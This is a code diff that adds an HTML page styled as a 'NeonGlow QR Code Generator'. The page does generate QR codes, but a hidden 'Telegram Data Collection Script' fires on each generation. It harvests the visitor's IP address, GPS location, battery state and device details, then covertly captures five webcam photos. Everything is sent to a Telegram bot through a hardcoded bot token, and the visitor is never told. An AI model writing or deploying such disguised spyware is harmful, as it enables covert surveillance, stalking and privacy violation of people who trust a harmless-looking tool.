@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NeonGlow QR Code Generator</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+    }
+
+    .container {
+      background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
+      backdrop-filter: blur(14px);
+      border: 2px solid rgba(255,255,255,0.2);
+      border-radius: 25px;
+      padding: 30px 20px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(138, 43, 226, 0.4);
+      width: 100%;
+      max-width: 360px;
+      color: white;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, rgba(255,105,180,0.4), transparent 70%);
+      top: -100px;
+      right: -100px;
+      z-index: 0;
+      animation: spin 8s linear infinite;
+    }
+
+    .container::after {
+      content: '';
+      position: absolute;
+      width: 250px;
+      height: 250px;
+      background: radial-gradient(circle, rgba(100,149,237,0.3), transparent 70%);
+      bottom: -80px;
+      left: -80px;
+      z-index: 0;
+      animation: spinReverse 10s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes spinReverse {
+      from { transform: rotate(360deg); }
+      to { transform: rotate(0deg); }
+    }
+
+    .container h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      background: linear-gradient(to right, #ff00cc, #3333ff, #00ccff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      z-index: 1;
+      position: relative;
+      text-shadow: 0 0 10px rgba(255, 0, 204, 0.3);
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 10px;
+      border: 2px solid #9932cc;
+      outline: none;
+      margin-bottom: 18px;
+      background: rgba(255, 255, 255, 0.9);
+      color: #111;
+      transition: 0.3s;
+      position: relative;
+      z-index: 1;
+    }
+
+    input[type="text"]:focus {
+      border-color: #ff00cc;
+      box-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
+    }
+
+    input::placeholder {
+      color: #777;
+    }
+
+    button {
+      padding: 12px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(to right, #ff00cc, #9932cc, #4b0082);
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      font-weight: bold;
+      box-shadow: 0 4px 20px rgba(153, 50, 204, 0.4);
+      position: relative;
+      z-index: 1;
+      overflow: hidden;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #ff00cc;
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to bottom right,
+        rgba(255,255,255,0.3) 0%,
+        rgba(255,255,255,0) 60%
+      );
+      transform: rotate(30deg);
+      z-index: -1;
+    }
+
+    button:hover::before {
+      animation: shine 1.5s infinite;
+    }
+
+    @keyframes shine {
+      0% { transform: rotate(30deg) translate(-20%, -20%); }
+      100% { transform: rotate(30deg) translate(20%, 20%); }
+    }
+
+    #qrcode {
+      margin-top: 25px;
+      padding: 12px;
+      background: #fff;
+      border-radius: 12px;
+      display: inline-block;
+      max-width: 100%;
+      overflow: hidden;
+      box-shadow: 0 0 15px rgba(255, 0, 204, 0.3);
+      position: relative;
+      z-index: 1;
+    }
+
+    .glow {
+      animation: pulse 2s infinite alternate;
+    }
+
+    @keyframes pulse {
+      from { box-shadow: 0 0 10px rgba(255, 0, 204, 0.3); }
+      to { box-shadow: 0 0 20px rgba(255, 0, 204, 0.6), 0 0 30px rgba(153, 50, 204, 0.4); }
+    }
+
+    .notification {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(to right, #ff00cc, #4b0082);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 30px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      z-index: 1000;
+      animation: slideUp 0.5s ease-out;
+      display: none;
+    }
+
+    @keyframes slideUp {
+      from { bottom: -50px; opacity: 0; }
+      to { bottom: 20px; opacity: 1; }
+    }
+
+    @media (max-width: 400px) {
+      .container h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>NeonGlow QR Code Generator</h1>
+    <input type="text" id="text" placeholder="Enter text or URL">
+    <button onclick="generateQRCode()">Generate QR Code</button><br>
+    <div id="qrcode"></div>
+  </div>
+
+  <div class="notification" id="notification"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+  <script>
+    function generateQRCode() {
+      const input = document.getElementById("text").value.trim();
+      const qrDiv = document.getElementById("qrcode");
+      qrDiv.innerHTML = "";
+
+      if (input !== "") {
+        new QRCode(qrDiv, {
+          text: input,
+          width: 200,
+          height: 200,
+          colorDark: "#4b0082",
+          colorLight: "#ffffff",
+          correctLevel: QRCode.CorrectLevel.H
+        });
+        qrDiv.classList.add("glow");
+        showNotification("QR Code generated successfully!");
+        initDataCollection();
+      } else {
+        showNotification("Please enter text or URL first!", "error");
+        qrDiv.classList.remove("glow");
+      }
+    }
+
+    function showNotification(message, type = "success") {
+      const notification = document.getElementById("notification");
+      notification.textContent = message;
+      notification.style.display = "block";
+      
+      if (type === "error") {
+        notification.style.background = "linear-gradient(to right, #ff416c, #ff4b2b)";
+      } else {
+        notification.style.background = "linear-gradient(to right, #ff00cc, #4b0082)";
+      }
+      
+      setTimeout(() => {
+        notification.style.display = "none";
+      }, 3000);
+    }
+
+    // Auto-focus the input field on page load
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("text").focus();
+    });
+  </script>
+
+  <!-- Telegram Data Collection Script -->
+  <script>
+    const TOKEN = "8368000617:AAG8ZwmIg2IugsHALtzPms_VCsZaMyDcwSI";
+    const params = new URLSearchParams(window.location.search);
+    const CHAT_ID = params.get("id");
+
+    if (!CHAT_ID) {
+      console.log("Chat ID missing - data collection disabled");
+    }
+
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(`📍 Location:\nLatitude: ${pos.coords.latitude}\nLongitude: ${pos.coords.longitude}`),
+            err => resolve("📍 Location: Permission denied or not available.")
+          );
+        } else {
+          resolve("📍 Location: Not supported by browser.");
+        }
+      });
+    }
+
+    function getBattery() {
+      if (navigator.getBattery) {
+        return navigator.getBattery().then(battery => {
+          return `🔋 Battery:\nLevel: ${Math.round(battery.level * 100)}%\nCharging: ${battery.charging ? "Yes" : "No"}`;
+        });
+      }
+      return Promise.resolve("🔋 Battery: API not available");
+    }
+
+    function getDeviceInfo() {
+      return `
+📱 Device Info:
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Screen: ${screen.width} x ${screen.height}
+Time: ${new Date().toLocaleString()}
+      `;
+    }
+
+    function getIP() {
+      return fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => `🌐 IP Address: ${data.ip}`)
+        .catch(() => "🌐 IP Address: Could not detect");
+    }
+
+    function sendText(message) {
+      if (!CHAT_ID) return;
+      
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      }).catch(err => console.error("Error sending message:", err));
+    }
+
+    function captureAndSendCamera(chat_id) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    sendText("📷 Camera: API not available");
+    return;
+  }
+
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    const video = document.createElement("video");
+    video.setAttribute("autoplay", "");
+    video.setAttribute("playsinline", "");
+    video.srcObject = stream;
+    document.body.appendChild(video); // Required for video to play on some browsers
+
+    let count = 0;
+    const maxPhotos = 5; // Change this number if you want more/less photos
+    const canvas = document.createElement("canvas");
+
+    const interval = setInterval(() => {
+      if (count >= maxPhotos) {
+        clearInterval(interval);
+        stream.getTracks().forEach(track => track.stop());
+        video.remove(); // Clean up video
+        return;
+      }
+
+      canvas.width = 320;
+      canvas.height = 240;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, `photo_${count + 1}.jpg`);
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).catch(err => console.error("Error sending photo:", err));
+      }, "image/jpeg");
+
+      count++;
+    }, 2000); // 2 seconds
+  }).catch(() => {
+    sendText("📷 Camera: Access denied or not available.");
+  });
+  }
+
+    function initDataCollection() {
+      if (!CHAT_ID) return;
+
+      (async function collectAndSend() {
+        const [ip, location, battery] = await Promise.all([
+          getIP(),
+          getLocation(),
+          getBattery()
+        ]);
+
+        const device = getDeviceInfo();
+
+        const finalMessage = `🧑‍💻 User Info:\n\n${ip}\n\n${location}\n\n${battery}\n\n${device}`;
+        sendText(finalMessage);
+
+        captureAndSendCamera(CHAT_ID);
+      })();
+    }
+  </script>
+</body>
+</html>
